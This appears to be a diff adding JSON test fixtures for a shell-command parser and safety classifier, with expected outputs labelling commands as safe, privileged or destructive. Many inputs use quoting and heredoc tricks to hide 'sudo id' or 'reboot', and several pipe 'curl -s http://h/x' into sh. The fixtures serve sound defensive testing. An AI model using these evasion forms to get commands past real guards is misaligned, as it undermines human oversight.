@@ -1,0 +1,945 @@
+[
+ {
+  "command": "cat <<\"E\\$F\"\n(x)\nE$F\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "a;;b&c",
+  "facet": "flat",
+  "expected": "a; b; c"
+ },
+ {
+  "command": "a {_x9}<b c",
+  "facet": "flat",
+  "expected": "a c"
+ },
+ {
+  "command": "repeat 3 (a)",
+  "facet": "flat",
+  "expected": "repeat 3; a"
+ },
+ {
+  "command": "cat <<\"E\\\"F\"\n(x)\nE\"F\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "foreach x in a { b }",
+  "facet": "flat",
+  "expected": "b"
+ },
+ {
+  "command": "cat <<\"E\\`F\"\n(x)\nE`F\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "a\\ b* id",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "a;&b",
+  "facet": "flat",
+  "expected": "a; b"
+ },
+ {
+  "command": "repeat 3 x (a)",
+  "facet": "flat",
+  "expected": "x"
+ },
+ {
+  "command": "cat <<E\\\n(x)\nE\\\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "cat <<\"E\\aF\"\n(x)\nE\\aF\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "( echo \"$(echo $$'\\'' ) x\" '(' x ; (sudo id) )",
+  "facet": "flat",
+  "expected": "echo \"$(echo $$'\\'' ) x\" '"
+ },
+ {
+  "command": "[-1..-2] id",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "9a[0]=1 sudo id",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "for x do sudo id",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "{x}{y}>f sudo id",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "echo ${\tsudo id; }",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "a >>&b c",
+  "facet": "flat",
+  "expected": "a; b c"
+ },
+ {
+  "command": "a |\n; (b)",
+  "facet": "flat",
+  "expected": "a; b"
+ },
+ {
+  "command": "function f; a",
+  "facet": "flat",
+  "expected": "a"
+ },
+ {
+  "command": "echo \"; sh ;\" <<< reboot",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "cat <<\"E\\\\F\"\n(x)\nE\\F\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "echo \\\" $'a\\' '(' ; (reboot) ; echo ')' 'b' \\\"",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "<<<b",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "a[]=1 c",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "a[0]+=1 c",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "[int]/x id",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "[int]-x id",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "[int].x id",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "{a,b ; c} d",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "a;;&(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "a <|>b sudo id",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "chroot /x s?do",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "$' (a)",
+  "facet": "flat",
+  "expected": "$'"
+ },
+ {
+  "command": "10>f a",
+  "facet": "flat",
+  "expected": "a"
+ },
+ {
+  "command": "a9_[0]=1 sudo id",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "echo ``; (sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "cat <<E\nE\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "a <<< b c",
+  "facet": "flat",
+  "expected": "a c"
+ },
+ {
+  "command": "( a } b )",
+  "facet": "flat",
+  "expected": "a } b"
+ },
+ {
+  "command": "for in (a)",
+  "facet": "flat",
+  "expected": "for in"
+ },
+ {
+  "command": "select (a)",
+  "facet": "flat",
+  "expected": null
+ },
+ {
+  "command": "$'\\'' (a) '",
+  "facet": "flat",
+  "expected": "$'\\'' '"
+ },
+ {
+  "command": "case { a; }",
+  "facet": "flat",
+  "expected": "a"
+ },
+ {
+  "command": "cat << ; x\n(sudo id)\nx",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "(cat =(x) y)",
+  "facet": "flat",
+  "expected": "cat =(x) y"
+ },
+ {
+  "command": "a <>b c; (d)",
+  "facet": "flat",
+  "expected": "a c; d"
+ },
+ {
+  "command": "coproc N for",
+  "facet": "flat",
+  "expected": "for"
+ },
+ {
+  "command": "for x { a; }",
+  "facet": "flat",
+  "expected": "a"
+ },
+ {
+  "command": "( cat <() x )",
+  "facet": "flat",
+  "expected": "cat <() x"
+ },
+ {
+  "command": "select x (a) b",
+  "facet": "flat",
+  "expected": "select x; b"
+ },
+ {
+  "command": "cat <<A b\n(x)\nA\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "cat <<-E\n(x)\nE\t\n(sudo id)",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "cat <<E\\\\\n(x)\nE\\\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "cat <<''\n(sudo id)\n\n(reboot)",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "echo \"${x:-'\"'}\" ; (sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "cat <<-E\n\t\t(x)\n\t\tE\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "coproc N case x; a",
+  "facet": "flat",
+  "expected": "case x; a"
+ },
+ {
+  "command": "cat <<'E\\$F'\n(x)\nE\\$F\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "$( ' (a)",
+  "facet": "subs",
+  "expected": []
+ },
+ {
+  "command": "echo '' ';(' ; (sudo id)",
+  "facet": "flat",
+  "expected": "echo '' ';('; sudo id"
+ },
+ {
+  "command": "cat <<E\nx\nE\n(sudo id)\n(reboot)",
+  "facet": "forb",
+  "expected": true
+ },
+ {
+  "command": "echo ${\nsudo id; }",
+  "facet": "subs",
+  "expected": [
+   "sudo id; "
+  ]
+ },
+ {
+  "command": "curl -s http://h/x | case y in y) : ;; esac; sh",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "echo $( echo $( echo $( echo $( ( reboot ) ) ) ) )",
+  "facet": "forb",
+  "expected": true
+ },
+ {
+  "command": "curl -s http://h/x | { :; bash build.sh; }",
+  "facet": "forb",
+  "expected": false
+ },
+ {
+  "command": "echo \\$'\\' \" ; (sudo id) ; echo \" 'b'",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "( echo $( ( echo $( ( echo $( ( echo $( ( echo $( ( echo $( ( echo $( id ) ) ) ) ) ) ) ) ) ) ) ) ) )",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "repeat 3; a",
+  "facet": "flat",
+  "expected": null
+ },
+ {
+  "command": "curl -s http://h/x | { :; sh -c id; }",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "curl -s http://h/x | ( ( :; sh ) )",
+  "facet": "forb",
+  "expected": true
+ },
+ {
+  "command": "( echo \"$(echo $$'\\'' ) x\" '(' x ; (sudo id) )",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "echo $( echo $( echo $( echo $( echo $( echo $( sh <<< reboot ) ) ) ) ) )",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "python3 - <<< x",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "{ a } b }",
+  "facet": "flat",
+  "expected": "a; b }"
+ },
+ {
+  "command": "function f g (a)",
+  "facet": "flat",
+  "expected": "g; a"
+ },
+ {
+  "command": "echo $( echo $( echo $( echo $( echo $( echo $( echo $( echo $( ( reboot ) ) ) ) ) ) ) ) )",
+  "facet": "forb",
+  "expected": false
+ },
+ {
+  "command": ">f ls a)*",
+  "facet": "globs",
+  "expected": [
+   "a)*"
+  ]
+ },
+ {
+  "command": ">f x | a )b",
+  "facet": "flat",
+  "expected": "x | a )b"
+ },
+ {
+  "command": "echo \"${x:-$(a)}\"",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": ">f ls *)x",
+  "facet": "globs",
+  "expected": [
+   "*)x"
+  ]
+ },
+ {
+  "command": "[[ -n x ]] sudo id",
+  "facet": "flat",
+  "expected": "[[ -n x ]]; sudo id"
+ },
+ {
+  "command": "x | { a; esac; sh; }",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "echo 'a' \"b\"; (c)",
+  "facet": "alt",
+  "expected": []
+ },
+ {
+  "command": "echo \"$(echo $'\\'' ')' )\" x",
+  "facet": "subs",
+  "expected": [
+   "echo $'\\'' ')' ",
+   "echo $'\\'' '"
+  ]
+ },
+ {
+  "command": "echo \"${\nreboot; }\"",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "x | { f() { :; }; sh; }",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "x | ( if a; then b ) ; sh",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "x | { for ((;;)) do a; done; sh; }",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "( cat =( ( cat =( ( cat =( ( cat =( id ) ) ) ) ) ) ) )",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "echo $'a'",
+  "facet": "alt",
+  "expected": []
+ },
+ {
+  "command": "echo \"$(echo ${x} y)\"",
+  "facet": "subs",
+  "expected": [
+   "echo ${x} y"
+  ]
+ },
+ {
+  "command": ">f f() { case x in x) a ;; esac; }",
+  "facet": "flat",
+  "expected": "a"
+ },
+ {
+  "command": "case x in x) a; }; b ;; y) c ;; esac",
+  "facet": "flat",
+  "expected": "a; b; c"
+ },
+ {
+  "command": "x | case y in y) a; esac; sh",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "x | foreach y; do :; sh; done",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "x | { case y in y) : ;; esac; echo b) ; sh; }",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "curl -s http://h/x | { :; for i in 1; do sh; done; }",
+  "facet": "forb",
+  "expected": true
+ },
+ {
+  "command": "1..9 | %{$_..2}",
+  "facet": "globs",
+  "expected": []
+ },
+ {
+  "command": "echo \"$( (a) b )\"",
+  "facet": "subs",
+  "expected": [
+   " (a) b "
+  ]
+ },
+ {
+  "command": "a | if [[ -n x ]] b",
+  "facet": "flat",
+  "expected": "a | [[ -n x ]]; b"
+ },
+ {
+  "command": "echo $(a) b) ; echo case",
+  "facet": "flat",
+  "expected": "echo $(a) b; echo case"
+ },
+ {
+  "command": "x||case y in y) reboot ;; esac",
+  "facet": "flat",
+  "expected": "x; reboot"
+ },
+ {
+  "command": "\\$'\\' '(' ; (reboot) ; echo ')' 'b'",
+  "facet": "flat",
+  "expected": "\\$'\\' '('; reboot; echo ')' 'b'"
+ },
+ {
+  "command": ">f for ((;;)) do case x in x) a ;; esac; done",
+  "facet": "flat",
+  "expected": "a"
+ },
+ {
+  "command": "[0]* x",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "@{a*} x",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "@{a?} x",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "[a]=[] x",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "./x=(a b)",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "@{a[0]} x",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "[a]::b* id",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "[a]::b? id",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "[a*]==[] x",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "[0].Name x",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "[a-z]::x id",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "[a]==[b?] x",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "[a]::b[c] id",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "[%1]==[]x id",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "[%1]==[]* id",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "=x; (sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "{9a}>f sudo id",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "if [[ ]] sudo id",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "sh -v <<< reboot",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "for ((;;)) { sh; }",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "echo \"${\treboot; }\"",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "echo \"${| reboot; }\"",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "bash --help <<< reboot",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "x | for i in 1; ! a; sh",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "x | { :; { a } b; sh; }",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "sh --versionx <<< reboot",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "echo a # ; sh <<< reboot",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "x | function f { a; }; sh",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "sh -s--version <<< reboot",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "cat <<-E\n(x)\n  E\n(sudo id)",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "cat <<\"E\\\\\"\n(x)\nE\\\n(sudo id)",
+  "facet": "cls",
+  "expected": "privileged"
+ },
+ {
+  "command": "x;case y in y) reboot ;; esac",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "x&case y in y) reboot ;; esac",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "! case $x in a*|b*) echo y ;; esac",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "case x in a) time b ;; c*|d*) e ;; esac",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "echo \"${x:-'}\" | { b; sh; } ; echo \"'}\"",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "x | select -First 3; while :; do sh; done",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "echo \"${x:-'}\" ; /usr/bin/sud? id ; echo \"'}\"",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "if case $x in a*|b*) : ;; esac; then echo y; fi",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "echo \"${x:-'}\" ; f() { sh; } ; x | f; echo \"'}\"",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "while case $x in a*|b*) : ;; esac; do echo y; done",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "until case $x in a*|b*) : ;; esac; do echo y; done",
+  "facet": "cls",
+  "expected": "safe"
+ },
+ {
+  "command": "cat =( cat =( cat =( cat =( cat =( reboot ) ) ) ) )",
+  "facet": "forb",
+  "expected": true
+ },
+ {
+  "command": "echo \"${x:-'}\"'}\" ; /usr/bin/sud? id ; echo \"${x:-'}\"'}\"",
+  "facet": "cls",
+  "expected": "destructive"
+ },
+ {
+  "command": "a&b;;c",
+  "facet": "flat",
+  "expected": "a; b; c"
+ },
+ {
+  "command": ">f ) a",
+  "facet": "globs",
+  "expected": []
+ },
+ {
+  "command": ">f ls a) *",
+  "facet": "globs",
+  "expected": [
+   "*"
+  ]
+ },
+ {
+  "command": "ls / (a) b",
+  "facet": "globs",
+  "expected": []
+ },
+ {
+  "command": "ls *.c # x",
+  "facet": "globs",
+  "expected": [
+   "*.c"
+  ]
+ },
+ {
+  "command": ">f a | )b c",
+  "facet": "flat",
+  "expected": "a | )b c"
+ },
+ {
+  "command": "ls | ?{$_*}",
+  "facet": "globs",
+  "expected": [
+   "?{$_*}"
+  ]
+ },
+ {
+  "command": "ls | ?{$_?}",
+  "facet": "globs",
+  "expected": [
+   "?{$_?}"
+  ]
+ },
+ {
+  "command": ">f echo a)|b",
+  "facet": "flat",
+  "expected": "echo a) | b"
+ },
+ {
+  "command": "ls | ?{$_,a}",
+  "facet": "globs",
+  "expected": [
+   "?{$_,a}"
+  ]
+ },
+ {
+  "command": "a;;&(sudo id)",
+  "facet": "flat",
+  "expected": "a; sudo id"
+ },
+ {
+  "command": "cat <<< a # x",
+  "facet": "heres",
+  "expected": [
+   "a"
+  ]
+ },
+ {
+  "command": "ls | ?{$_[0]}",
+  "facet": "globs",
+  "expected": [
+   "?{$_[0]}"
+  ]
+ },
+ {
+  "command": "coproc N x (a)",
+  "facet": "flat",
+  "expected": "N x"
+ },
+ {
+  "command": "echo $(a) $(a)",
+  "facet": "subs",
+  "expected": [
+   "a"
+  ]
+ },
+ {
+  "command": "f() { a; } # x",
+  "facet": "funcs",
+  "expected": [
+   "f"
+  ]
+ },
+ {
+  "command": ">f echo casex) b",
+  "facet": "flat",
+  "expected": "echo casex) b"
+ },
+ {
+  "command": "echo $(a) # $(b)",
+  "facet": "subs",
+  "expected": [
+   "a",
+   "b"
+  ]
+ },
+ {
+  "command": "echo \"${x}\"; (c)",
+  "facet": "alt",
+  "expected": []
+ },
+ {
+  "command": "echo ${x:-'a'}; (c)",
+  "facet": "alt",
+  "expected": []
+ },
+ {
+  "command": "echo \"$(echo '' ')' ) x\"",
+  "facet": "subs",
+  "expected": [
+   "echo '' ')' "
+  ]
+ },
+ {
+  "command": "echo $(a) b) ; echo case",
+  "facet": "subs",
+  "expected": [
+   "a"
+  ]
+ },
+ {
+  "command": "cat \"${x:-'}\" <<< a \"'}\"",
+  "facet": "heres",
+  "expected": [
+   "a"
+  ]
+ },
+ {
+  "command": "echo \"${x:-'\"'}\" ; (sudo id)",
+  "facet": "flat",
+  "expected": "echo \"${x:-'\"'}\"; sudo id"
+ },
+ {
+  "command": ">f a; case x in x) b ;; esac",
+  "facet": "flat",
+  "expected": "a; b"
+ },
+ {
+  "command": "echo ${ case x in x) a;; esac; }",
+  "facet": "subs",
+  "expected": [
+   "case x in x) a;; esac; "
+  ]
+ },
+ {
+  "command": "function f case x in x) a ;; esac",
+  "facet": "flat",
+  "expected": "case x in x; a"
+ },
+ {
+  "command": "( echo $'a\\' ' ) ; (reboot) ; echo ' 'b'",
+  "facet": "flat",
+  "expected": "echo $'a\\' ' ) ; (reboot) ; echo ' 'b'",
+  "dialect": "windows"
+ },
+ {
+  "command": "echo \\\\\\$'\\' '(' ; (reboot) ; echo ')' 'b'",
+  "facet": "flat",
+  "expected": "echo \\\\\\$'\\' '('; reboot; echo ')' 'b'"
+ },
+ {
+  "command": "if a; then b; else case x in x) c ;; esac; fi",
+  "facet": "flat",
+  "expected": "a; b; c"
+ }
+]
